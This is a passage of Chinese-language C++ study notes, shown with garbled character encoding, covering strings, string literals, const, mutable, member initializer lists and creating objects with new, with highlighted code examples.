çš„æ›´è¿‘ï¼Œè¡¨ç¤ºæŒ‡å‘å†…å®¹ä¸å¯æ”¹å˜ï¼Œä½†æŒ‡é’ˆå¯ä»¥é‡æ–°èµ‹å€¼ï¼Œè¿™å±äº<strong>åº•å±‚const</strong>ã€‚</p><p><strong>C++ä¸­string</strong></p><p>å®é™…ä¸Šæœ‰ä¸€ä¸ªBasicStringæ¨¡ç‰ˆç±»ï¼Œstd::stringæ˜¯BasicStringç±»çš„æ¨¡ç‰ˆç‰¹åŒ–ç‰ˆæœ¬â€”â€”å°†BasicStringæ¨¡ç‰ˆç±»ä¸­çš„æ¨¡ç‰ˆå‚æ•°è®¾ç½®ä¸ºcharï¼Œè¿™å«<code>æ¨¡ç‰ˆç‰¹åŒ–ï¼ˆtemplate specializationï¼‰</code> ã€‚</p><p>æŠŠç±»ï¼ˆå¯¹è±¡ï¼‰ä¼ ç»™ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œå®é™…åœ¨è¿›è¡Œå¤åˆ¶ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span>  <span class="comment">// è™½ç„¶åŒ…å« &lt;iostream&gt; åèƒ½ä½¿ç”¨ std::string åº”è¯¥æ˜¯ç¡®å®šçš„ï¼Œä¸è¿‡ä¸ä¸€å®šç­‰ä»·äºåŒ…å« &lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//std::string name = &quot;Hello&quot; + &quot; JKA&quot;;  // const char* æ•°ç»„æ²¡æœ‰åŠ æ³•</span></span><br><span class="line">  std::string name = std::<span class="built_in">string</span>(<span class="string">&quot;Hello &quot;</span>) + <span class="string">&quot;JKA&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (name.<span class="built_in">find</span>(<span class="string">&quot;JK&quot;</span>) == std::string::npos) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="32-String-Literals-in-C">32 String Literals in C++</h1><p>å­—ç¬¦ä¸²å­—é¢é‡ æ˜¯åœ¨åŒå¼•å·ä¹‹å‰çš„ä¸€ä¸²å­—ç¬¦ã€‚</p><p>å­—ç¬¦ä¸²å­—é¢é‡æ°¸è¿œæ˜¯å­˜å‚¨åœ¨å†…å­˜çš„.rodataéƒ¨åˆ†ï¼Œä¸èƒ½ä¿®æ”¹ï¼ˆå³å€¼ï¼‰ï¼Œå¦åˆ™ä¸ºæœªå®šä¹‰è¡Œä¸ºï¼Œå¯èƒ½æ— æ³•ç¼–è¯‘/ç¼–è¯‘æŠ¥é”™/è¿è¡Œæ—¶å‘ç°å­—ç¬¦ä¸²å¹¶ä¸ºè¢«ä¿®æ”¹ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;string&gt;  // è™½åŒ…å« &lt;iostream&gt; åèƒ½ä½¿ç”¨ std::stringï¼Œä½†ä¸ç­‰ä»·äºåŒ…å« &lt;string&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> name[<span class="number">8</span>] = <span class="string">&quot;JK\0A&quot;</span>;  <span class="comment">// &quot;JK&quot;åé¢è·Ÿä¸€ä¸ªç»“æŸæ ‡å¿—\0, å†è·Ÿä¸€ä¸ªå­—æ¯&#x27;A&#x27;</span></span><br><span class="line">  std::cout &lt;&lt; <span class="built_in">strlen</span>(name) &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>cout å¯¹äº wchar_t* , char16_t*, char32_t* ï¼Œéƒ½åªä¼šè¾“å‡ºé¦–åœ°å€ï¼Œ å¦‚æœæƒ³è¦è¾“å‡º wchar_t* çš„å†…å®¹ï¼Œé‚£ä¹ˆéœ€è¦ç”¨ std::wcout ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* name = <span class="string">u8&quot;JKA&quot;</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">wchar_t</span>* name2 = <span class="string">L&quot;JKA&quot;</span>;  <span class="comment">// å®½å­—ç¬¦:ä¸åŒç¯å¢ƒå­—èŠ‚æ•°ä¸åŒ,windowsä¸‹2å­—èŠ‚,Linuxä¸‹4å­—èŠ‚</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char16_t</span>* name3 = <span class="string">u&quot;JKA&quot;</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">char32_t</span>* name4 = <span class="string">U&quot;JKA&quot;</span>;</span><br><span class="line">  std::cout &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">  std::wcout &lt;&lt; name2 &lt;&lt; std::endl;  <span class="comment">// std::wcout</span></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤šè¡Œå­—ç¬¦ä¸²çš„ç­‰ä»·å†™æ³•</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* exp = <span class="string">R&quot;(Line1</span></span><br><span class="line"><span class="string">Line2</span></span><br><span class="line"><span class="string">Line3</span></span><br><span class="line"><span class="string">)&quot;</span>;</span><br><span class="line">  std::cout &lt;&lt; exp &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* exp2 = <span class="string">&quot;Line4\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Line5\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Line6\n&quot;</span>;</span><br><span class="line">  std::cout &lt;&lt; exp2 &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="33-CONST-in-C">33 CONST in C++</h1><p>constæ˜¯é™å®šç¬¦ï¼Œæ˜¯ä¼ªå…³é”®å­—ï¼Œå› ä¸ºå®ƒåœ¨æ”¹å˜ç”Ÿæˆä»£ç æ–¹é¢ä»€ä¹ˆä¹Ÿåšä¸äº†ã€‚constæœ‰ç‚¹åƒç±»å’Œç»“æ„ä½“çš„å¯è§æ€§ï¼Œå°±åƒæ‰¿è¯ºâ€”â€”å¯ä»¥ç»•è¿‡æˆ–æ‰“ç ´ï¼Œè¿™ä¸ªæ‰¿è¯ºå®é™…ä¸Šå¯ä»¥ç®€åŒ–å¾ˆå¤šä»£ç ã€‚</p><blockquote><p>ğŸ’¡ ä¸ªäººç†è§£ï¼šconstå°±åƒæ‰¿è¯ºï¼Œé™åˆ¶æŸä¸ªå¼•ç”¨ä¸ºconståªæ˜¯è¯´é€šè¿‡è¿™ä¸ªå¼•ç”¨ä¸èƒ½æ”¹å˜ï¼Œä½†å¯ä»¥å­˜åœ¨å…¶ä»–å†…å­˜åˆ«åæ˜¯éconstçš„ï¼Œé€šè¿‡å…¶ä»–æ–¹å¼å°±èƒ½è¿›è¡Œè¯»å†™ã€‚</p></blockquote><h2 id="ç”¨æ³•1ï¼šæ”¾åœ¨å˜é‡å‰é¢">ç”¨æ³•1ï¼šæ”¾åœ¨å˜é‡å‰é¢</h2><h2 id="ç”¨æ³•2ï¼š-ä¸æŒ‡é’ˆç»„åˆ">ç”¨æ³•2ï¼š ä¸æŒ‡é’ˆç»„åˆ</h2><p><code>int const*</code> å’Œ<code>const int*</code> ç›¸åŒï¼Œåœ¨<em>å‰ï¼Œèƒ½å¤Ÿè®©æŒ‡é’ˆæŒ‡å‘å†…å®¹ä¸èƒ½è¢«ä¿®æ”¹ï¼ˆåº•å±‚constï¼‰ã€‚<br>å¦‚æœè¦è®©æŒ‡é’ˆæœ¬èº«æˆä¸ºå¸¸é‡ï¼Œéœ€è¦æ”¾åˆ°</em>åï¼ˆé¡¶å±‚const)ã€‚**</p><ul><li><code>const int* a = new int;</code> å’Œ <code>int const* a = new int;</code>åªæ˜¯ä¸èƒ½æ”¹å˜æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼Œä½†æ˜¯å¯ä»¥æ”¹å˜æŒ‡é’ˆæœ¬èº« <code>a = ï¼ˆint*)&amp;MAX_AGE;</code></li><li><code>int* const a = new int;</code> æ­£å¥½ç›¸åï¼Œå¯ä»¥æ”¹å˜æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹<code>*a = 2;</code>ï¼Œä½†æ˜¯ä¸èƒ½æŠŠæŒ‡é’ˆé‡æ–°èµ‹å€¼ã€‚</li><li><code>const int* const a = new int;</code> äºŒè€…éƒ½æ— æ³•ä¿®æ”¹ã€‚</li></ul><blockquote><p>ğŸ’¡ è¿™é‡Œæ›´å»ºè®®é˜…è¯»ã€ŠC++ Primer ç¬¬5ç‰ˆã€‹P56ï¼Œä»å³å‘å·¦é˜…è¯»ï¼Œçœ‹consté™å®šç¬¦è·ç¦»æŒ‡é’ˆå˜é‡æ›´è¿‘ï¼Œè¿˜æ˜¯è·ç¦»åŸºæœ¬æ•°æ®ç±»å‹æ›´è¿‘ã€‚ç†è§£åï¼Œå¯ä»¥å‘ç°è¿™ä¸Chernoè®²çš„æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ã€‚</p></blockquote><h2 id="ç”¨æ³•3ï¼šgetterä¸setter">ç”¨æ³•3ï¼šgetterä¸setter</h2><p><strong>getter</strong>ï¼šå°†const æ”¾åœ¨æ–¹æ³•åçš„å³è¾¹ï¼ˆåªåœ¨ç±»ä¸­æœ‰æ•ˆï¼‰ï¼Œè¡¨ç¤ºè¿™ä¸ªæ–¹æ³•ä¸ä¼šä¿®æ”¹ä»»ä½•å®é™…çš„ç±»â€”â€”åªèƒ½è¯»ä¸èƒ½å†™ï¼Œå› æ­¤ä¸èƒ½ä¿®æ”¹æˆå‘˜å˜é‡ã€‚</p><p><strong>åœ¨ç±»ä¸­ï¼Œå¦‚æœå®ƒä»¬å®é™…ä¸Šæ²¡æœ‰ä¿®æ”¹ç±»æˆ–è€…å®ƒä»¬ä¸åº”è¯¥ä¿®æ”¹ç±»ï¼Œåº”è¯¥æ€»æ˜¯å°†æ–¹æ³•å£°æ˜ä¸ºconst</strong>â€”â€”å¦åˆ™åœ¨æœ‰å¸¸é‡å¼•ç”¨æˆ–åˆ™ç±»ä¼¼çš„æƒ…å†µä¸‹ï¼Œå°±ç”¨ä¸äº†ä½ çš„æ–¹æ³•ã€‚</p><p>mutableå…è®¸getterï¼ˆå¸¸é‡æ–¹æ³•ï¼‰ä¿®æ”¹å˜é‡ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> m_X, m_Y;</span><br><span class="line">  <span class="keyword">mutable</span> <span class="type">int</span> var;  <span class="comment">// mutablä½¿å¾—constæ–¹æ³•ä¸­ä»ç„¶å¯ä¿®æ”¹æ­¤å˜é‡</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">GetX</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    var = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> m_X;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">SetX</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    m_X = x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintEntity</span><span class="params">(<span class="type">const</span> Entity&amp; e)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; e.<span class="built_in">GetX</span>() &lt;&lt; std::endl;  <span class="comment">// GetX()å¿…é¡»ä¸ºconstï¼Œå¦åˆ™ä¼šä¿®æ”¹Entity</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Entity e;</span><br><span class="line">  <span class="type">const</span> <span class="type">int</span>* a = <span class="keyword">new</span> <span class="type">int</span>;  <span class="comment">// åº•å±‚const</span></span><br><span class="line">  a = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="comment">//*a = 1;  // const æ”¾*å‰å°±ä¸èƒ½ä¿®æ”¹æŒ‡é’ˆæŒ‡å‘å†…å®¹ï¼Œä½†å¯æ”¹æŒ‡é’ˆæœ¬èº«</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="34-The-Mutable-Keyword-in-C">34 The Mutable Keyword in C++</h1><p>mutableï¼ˆå¯æ”¹å˜çš„ï¼Œimmutableæ„ä¸ºä¸å¯æ”¹å˜çš„   ï¼‰å®é™…ä¸Šæœ‰ä¸¤ç§ä¸åŒçš„ç”¨é€”ï¼š</p><ol><li>ä¿®é¥°classä¸­classæˆå‘˜å˜é‡ï¼Œä½¿å…¶åœ¨constæ–¹æ³•ä¸­å¯ä¿®æ”¹ã€‚ï¼ˆå¸¸ç”¨ï¼‰</li><li>ä¿®é¥°lambdaè¡¨è¾¾å¼ï¼Œå€¼æ•è·æ—¶å¯ä»¥ç›´æ¥æ“ä½œä¼ å…¥å‚æ•°ã€‚æ³¨æ„å¹¶éæ„å‘³ç€å¼•ç”¨æ•è·ï¼Œä¾æ—§å€¼æ•è·ï¼Œä¸ä¿®æ”¹åŸå€¼ã€‚</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_Name;</span><br><span class="line">  <span class="keyword">mutable</span> <span class="type">int</span> m_DebugCount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">const</span> std::string&amp; <span class="title">GetName</span><span class="params">()</span> <span class="type">const</span> </span>&#123;  <span class="comment">// mainä¸­æœ‰const Entityåˆ™è¿™é‡Œå¿…é¡»ä¸ºconst</span></span><br><span class="line">    ++m_DebugCount;</span><br><span class="line">    <span class="keyword">return</span> m_Name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> Entity e;</span><br><span class="line">  e.<span class="built_in">GetName</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> x = <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">auto</span> f = [=]() &#123;  <span class="comment">// æŒ‰å€¼ä¼ é€’ï¼Œmutableå£°æ˜åæ–¹å¯ä¿®æ”¹ï¼ˆæŒ‰å¼•ç”¨ä¼ é€’ä¸ç”¨åŠ ï¼‰</span></span><br><span class="line">    ++x;</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">f</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="35-Member-Initializer-Lists-in-C-Constructor-Initializer-List">35 Member Initializer Lists in C++ (Constructor Initializer List)</h1><p><strong>æ„é€ å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨çš„é¡ºåºè¦ä¸æˆå‘˜å˜é‡å£°æ˜æ—¶çš„é¡ºåºä¸€è‡´</strong>ï¼Œå¦åˆ™ç¼–è¯‘å™¨ä¼šæŠ¥è­¦å‘Šï¼Œç¼–è¯‘å™¨æ˜¯æŒ‰ç…§å˜é‡å®šä¹‰æ—¶é¡ºåºå»åˆå§‹åŒ–çš„ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> m_Score;</span><br><span class="line">  std::string m_Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>()</span><br><span class="line">    : <span class="built_in">m_Score</span>(<span class="number">0</span>), <span class="built_in">m_Name</span>(<span class="string">&quot;Unknown&quot;</span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">Entity</span>(<span class="type">const</span> std::string&amp; name)</span><br><span class="line">    : <span class="built_in">m_Score</span>(<span class="number">0</span>), <span class="built_in">m_Name</span>(name) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">const</span> std::string&amp; <span class="title">GetName</span><span class="params">()</span> <span class="type">const</span> </span>&#123;  <span class="comment">// mainä¸­æœ‰const Entityåˆ™è¿™é‡Œå¿…é¡»ä¸ºconst</span></span><br><span class="line">    <span class="keyword">return</span> m_Name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> Entity e;</span><br><span class="line">  std::cout &lt;&lt; e.<span class="built_in">GetName</span>() &lt;&lt; std::endl;</span><br><span class="line">  <span class="function"><span class="type">const</span> Entity <span class="title">e1</span><span class="params">(<span class="string">&quot;JKA&quot;</span>)</span></span>;</span><br><span class="line">  std::cout &lt;&lt; e1.<span class="built_in">GetName</span>() &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åº”è¯¥å°½å¯èƒ½ä½¿ç”¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ã€‚</p><p>å¥½å¤„ï¼šé™¤äº†è®©å‡½æ•°æ›´ç®€æ´ï¼ˆæ„é€ å‡½æ•°ä½“é‡Œä¸ç”¨å†™æ‚ä¹±çš„æˆå‘˜å˜é‡åˆå§‹åŒ–ï¼‰ï¼Œè¿˜æœ‰åŠŸèƒ½ä¸Šçš„åŒºåˆ«ï¼šä¸ä½¿ç”¨çš„è¯ä¼šå¯¼è‡´<strong>æˆå‘˜å˜é‡è¢«å®šä¹‰ä¸¤æ¬¡</strong>ï¼Œæµªè´¹æ€§èƒ½ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Example</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Example</span>(<span class="type">const</span> <span class="type">int</span> x) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity with &quot;</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_Name;</span><br><span class="line">  Example exp;  <span class="comment">// å®šä¹‰è¯­å¥ä¹Ÿä¼šæ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>()</span><br><span class="line">    : <span class="built_in">m_Name</span>(<span class="string">&quot;Unknown&quot;</span>) &#123;</span><br><span class="line">    exp = <span class="built_in">Example</span>(<span class="number">8</span>);  <span class="comment">// èˆå¼ƒæˆå‘˜å˜é‡åŒºåŸŸå®šä¹‰çš„Exampleï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæ€§Exampleå¯¹è±¡</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> Entity e;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line">Created Entity!</span><br><span class="line">Created Entity with <span class="number">8</span></span><br></pre></td></tr></table></figure><p>åº”è¯¥å°†æ‰€æœ‰çš„æˆå‘˜å˜é‡åˆå§‹åŒ–æ”¾åœ¨æˆå‘˜å˜é‡åˆå§‹åŒ–åˆ—è¡¨ä¸­ï¼š<code>: exp(8), m_Name(&quot;Unknown&quot;)</code> æˆ–<code>: exp(Example(8)), m_Name(&quot;Unknown&quot;)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_Name;</span><br><span class="line">  Example exp;  <span class="comment">// å®šä¹‰è¯­å¥ä¹Ÿä¼šæ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>()</span><br><span class="line">    : <span class="built_in">m_Name</span>(<span class="string">&quot;Unknown&quot;</span>), <span class="built_in">exp</span>(<span class="number">8</span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="36-Ternary-Operators-in-C-Conditional-Assignment">36 Ternary Operators in C++ (Conditional Assignment)</h1><p>ä¸‰ç›®è¿ç®—ç¬¦ã€‚</p><h1 id="37-How-to-CREATE-INSTANTIATE-OBJECTS-in-C">37 How to CREATE/INSTANTIATE OBJECTS in C++</h1><p>ä¸¤ç§åˆ›å»ºå¯¹è±¡çš„åŒºåˆ«æ˜¯ åœ¨å“ªå—å†…å­˜åˆ›å»ºå¯¹è±¡ï¼Œ<strong>å°½é‡ç”¨æ ˆ â€”â€”</strong> 1.æ€§èƒ½ï¼šå †å†…å­˜åˆ†é…æ—¶é—´é•¿ï¼›2.å †ä¸Šå¯¹è±¡éœ€è¦æ‰‹åŠ¨é‡Šæ”¾ï¼›ä½†æ˜¯æ ˆé€šå¸¸å°ï¼Œæ¯”å¦‚1~2Mï¼Œå¦‚æœæ”¾ä¸ä¸‹å°±å¾—æ”¾å †ä¸Šã€‚</p><ul><li>æ ˆ <code>Entity entity;</code> å°±å¯ä»¥äº†ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨æ„é€ å‡½æ•° æˆ– <code>Entity entity = Entity(â€JKAâ€);</code> æˆ–è€…<code>Entity entity(â€JKAâ€)</code> ã€‚<br>ç”Ÿå­˜å‘¨æœŸå†…å­˜åœ¨ï¼Œç”Ÿå­˜å‘¨æœŸä¸ä¸€å®šæ˜¯å‡½æ•°ï¼Œè¿˜å¯ä»¥æ˜¯ifæˆ–ç©ºï¼Œå³<code>&#123;&#125;</code> ã€‚</li><li>å † <code>Entity *entity = new Entity(â€JKAâ€);</code> ã€‚</li></ul><p>å³ä½¿å†™ä¸€ä¸ªå®Œå…¨ä¸ºç©ºçš„ç±»ï¼Œç±»ä¸­æ²¡æœ‰æˆå‘˜ï¼Œä¹Ÿè‡³å°‘éœ€è¦å ç”¨ä¸€ä¸ªå­—èŠ‚çš„å†…å­˜ã€‚</p><h1 id="38-The-NEW-Keyword-in-C">38 The NEW Keyword in C++</h1><p>newæ—¶ä¼šå‘OSè¦ä¸€å—nå­—èŠ‚çš„è¿ç»­å†…å­˜åŒºåŸŸï¼ŒOSæ‰¾åˆ°åè¿”å›æŒ‡é’ˆã€‚<br><code>int *pa = new int;</code> æˆ– <code>int *pa = new int[20];</code><br>Entity* e = new Entity() çš„æ•°ç»„ç‰ˆæœ¬ï¼š<code>Entity* e = new 